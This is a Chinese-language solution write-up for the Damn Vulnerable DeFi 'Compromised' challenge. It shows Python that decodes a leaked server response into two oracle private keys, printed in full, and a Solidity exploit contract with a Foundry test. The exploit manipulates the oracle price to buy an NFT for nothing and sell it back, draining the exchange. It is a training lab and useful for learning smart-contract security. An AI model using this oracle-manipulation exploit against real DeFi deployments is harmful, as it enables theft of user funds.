## 题目 [Compromised](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/compromised)
你在一个非常受欢迎的DeFi项目的Web服务中，得到了一个奇怪的服务器响应。以下是服务器响应的代码片段：  
```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```

你发现与之相关的一个链上交易所在出售一种叫“DVNFT”的（荒谬昂贵的）收藏品，每个售价高达 999 ETH。  
这个价格是由一个链上预言机提供的，基于三个可信报告者的报价：`0x188...088`、`0xA41...9D8`和`0xab3...a40`。  
从仅有的0.1 ETH余额开始，通过拯救交易所中所有可用的ETH来通过挑战。然后将资金存入指定的恢复账户。  


## 分析
在 `Exchange.sol` 合约中，提供了一个简单的 NFT 交易所，用 eth 购买 NFT，并且 eth 就存放在 `Exchange.sol` 合约中。  
其中 NFT 的价格由 `TrustfulOracle.sol` 预言机提供，价格来源的地址由这三个地址提供：
```
address[] sources = [
    0x188Ea627E3531Db590e6f1D71ED83628d1933088,
    0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
    0xab3600bF153A316dE44827e2473056d56B774a40
];
```
此外，题目中给出的信息为两个地址的私钥编码，我们通过解码后恢复私钥可以发现是两个预言机的私钥。

## 题解
1. 先恢复出两个预言机的私钥，从而控制 NFT 价格。
2. 设置 NFT 的价格为 0。
3. 买入一个 NFT。
4. 设置 NFT 的价格为 999 ether，即 exchange 合约中的余额。
5. 卖出刚刚买的 NFT。
6. 把获利转到恢复地址中。

恢复私钥方法(Hexadecimal -> ASCII -> DecodeBase64 -> String)：  
``` python
import base64

def hex_to_ascii(hex_str):
    ascii_str = ''
    for i in range(0, len(hex_str), 2):
        ascii_str += chr(int(hex_str[i:i+2], 16))
    return ascii_str

def decode_base64(base64_str):
    # Decode Base64 to ASCII
    return base64.b64decode(base64_str).decode('utf-8')

leaked_information = [
    '4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30',
    '4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35',
]

from eth_account import Account

for leak in leaked_information:
    hex_str = ''.join(leak.split())
    ascii_str = hex_to_ascii(hex_str)
    decoded_str = decode_base64(ascii_str)
    private_key = decoded_str
    print("Private Key:", private_key)
    
    # Create a wallet instance from the private key
    wallet = Account.from_key(private_key)
    
    # Get the public key (address)
    address = wallet.address
    print("Wallet address:", address)

```
```
Private Key: 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
Wallet address: 0x188Ea627E3531Db590e6f1D71ED83628d1933088
Private Key: 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
Wallet address: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
```

用来买卖 NFT 的合约：
``` solidity
contract CompromisedExploit is IERC721Receiver{
    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;
    uint256 nftId;
    address recovery;

    constructor(    
        TrustfulOracle _oracle,
        Exchange _exchange,
        DamnValuableNFT _nft,
        address _recovery
    ) payable {
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }

    function buy() external payable{
        uint _nftId = exchange.buyOne{value:1}();
        nftId = _nftId;
    }
    
    function sell() external payable{
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }

    function recover(uint amount) external {
        payable(recovery).transfer(amount);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        return this.onERC721Received.selector;
    }

    receive() external payable{
    }
}
```

测试代码：
``` solidity
function setPrice(uint price) internal {
    vm.startPrank(sources[0]);
    oracle.postPrice(symbols[0],price);
    vm.stopPrank();
    
    vm.startPrank(sources[1]);
    oracle.postPrice(symbols[0],price);
    vm.stopPrank();
}

/**
    * CODE YOUR SOLUTION HERE
    */
function test_compromised() public checkSolved {
    CompromisedExploit exploit = new CompromisedExploit{value:address(this).balance}(oracle, exchange, nft, recovery);

    setPrice(0);
    exploit.buy();
    
    setPrice(EXCHANGE_INITIAL_ETH_BALANCE);
    exploit.sell();

    exploit.recover(EXCHANGE_INITIAL_ETH_BALANCE);
}
```

运行测试： 
```
forge test --mp test/compromised/Compromised.t.sol
```

运行结果：
```
Ran 2 tests for test/compromised/Compromised.t.sol:CompromisedChallenge
[PASS] test_assertInitialState() (gas: 40535)
[PASS] test_compromised() (gas: 519221)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 9.29ms (1.80ms CPU time)
```


